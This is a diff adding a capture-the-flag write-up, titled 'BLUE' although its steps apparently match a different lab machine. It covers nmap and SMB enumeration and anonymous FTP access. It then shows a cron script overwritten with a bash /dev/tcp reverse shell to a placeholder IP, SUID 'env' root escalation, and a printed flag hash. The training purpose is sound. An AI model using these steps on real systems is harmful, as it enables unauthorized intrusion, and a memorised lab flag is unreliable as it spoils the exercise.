@@ -1,1 +1,275 @@
+# 🔵 TryHackMe / HTB – BLUE Writeup (Step-by-Step)
+
+## 📌 Introduction
+This writeup provides a detailed step-by-step solution for the **BLUE** machine, covering:
+
+- Enumeration  
+- Initial Access  
+- Privilege Escalation  
+
+The goal is not just to solve the machine, but to understand **why each step is performed**.
+
+---
+
+# 🔍 Q1) How many ports are open?
+
+## 🧠 Concept
+The first step in any penetration test is **Enumeration**, which means gathering as much information as possible about the target.
+
+## 🛠️ Tool: Nmap
+
+```bash
+nmap -sV -sC 10.114.143.36
+```
+
+## ❓ Why this command?
+
+- `-sV` → Detect service versions (important for finding vulnerabilities)
+- `-sC` → Run default scripts for additional info
+
+---
+
+## 📊 Result:
+
+```
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd
+22/tcp  open  ssh         OpenSSH 7.6p1
+139/tcp open  netbios-ssn Samba
+445/tcp open  netbios-ssn Samba
+```
+
+## ✅ Answer:
+**4 ports are open**
+
+---
+
+# 🔍 Q2) What service is running on port 21?
+
+From Nmap:
+
+```
+21/tcp open ftp
+```
+
+## ✅ Answer:
+```
+ftp
+```
+
+---
+
+# 🔍 Q3) What service is running on ports 139 and 445?
+
+## 🧠 Concept:
+Ports 139 and 445 are associated with **SMB (Server Message Block)**.
+
+Nmap shows:
+
+```
+Samba smbd
+```
+
+## ⚠️ Note:
+Samba is the Linux implementation of SMB.
+
+## ✅ Answer:
+```
+smb
+```
+
+---
+
+# 🔍 Q4) There's a share on the user's computer. What's it called?
+
+## 🧠 Concept:
+Since SMB is running, we enumerate shared folders.
+
+## 🛠️ Command:
+
+```bash
+smbclient -L //10.114.143.36 -N
+```
+
+## ❓ Why?
+
+- `-L` → List shares
+- `-N` → No password (anonymous access)
+
+---
+
+## 📊 Result:
+
+```
+Sharename       Type
+---------       ----
+pics            Disk
+```
+
+## ✅ Answer:
+```
+pics
+```
+
+---
+
+# 🔓 Q5) Get user.txt
+
+## 🧠 Concept:
+We have multiple entry points:
+- FTP (anonymous login allowed)
+- SMB
+
+We start with FTP because it is easier.
+
+---
+
+## 🛠️ Connect to FTP:
+
+```bash
+ftp 10.114.143.36
+```
+
+### Login:
+```
+Username: anonymous
+Password: (empty)
+```
+
+---
+
+## 📂 After login:
+We find a file:
+
+```
+clean.sh
+```
+
+---
+
+## 🧠 Important Insight:
+A writable script can be very dangerous because:
+- It might be executed automatically (cron job)
+- We can inject malicious commands
+
+---
+
+# 💣 Initial Access (Reverse Shell)
+
+## 🧠 Concept:
+We modify `clean.sh` to execute a reverse shell.
+
+---
+
+## 🛠️ Step 1: Start listener
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## 🛠️ Step 2: Modify the script
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+```
+
+Replace:
+```
+YOUR_IP → your machine IP
+```
+
+---
+
+## 🛠️ Step 3: Upload file
+
+```bash
+put clean.sh
+```
+
+---
+
+## 🎯 Result:
+When the script executes, we receive a shell connection.
+
+---
+
+## 📥 Read the flag:
+
+```bash
+cat user.txt
+```
+
+## ✅ Answer:
+```
+90d6f992585815ff991e68748c414740
+```
+
+---
+
+# 🔺 Privilege Escalation
+
+## 🧠 Goal:
+Escalate privileges from user to root.
+
+---
+
+## 🛠️ Step 1: Find SUID binaries
+
+```bash
+find / -user root -perm -4000 2>/dev/null
+```
+
+## ❓ Why?
+SUID binaries run with root privileges.
+
+---
+
+## 📌 Found:
+
+```
+/usr/bin/env
+```
+
+---
+
+## 🧠 Use GTFOBins
+
+GTFOBins provides known privilege escalation techniques.
+
+---
+
+## 💣 Exploit:
+
+```bash
+env /bin/sh -p
+```
+
+## ❓ Why it works?
+- `env` executes commands
+- `-p` preserves privileges
+
+---
+
+## 🎯 Result:
+
+```bash
+whoami
+```
+
+```
+root
+```
+
+---
+
+# 🧠 Key Takeaways
+
+- Enumeration is the most important phase
+- Anonymous FTP access is often an easy entry point
+- Writable files can lead to code execution
+- SUID binaries are critical for privilege escalation
+- GTFOBins is an essential resource
 
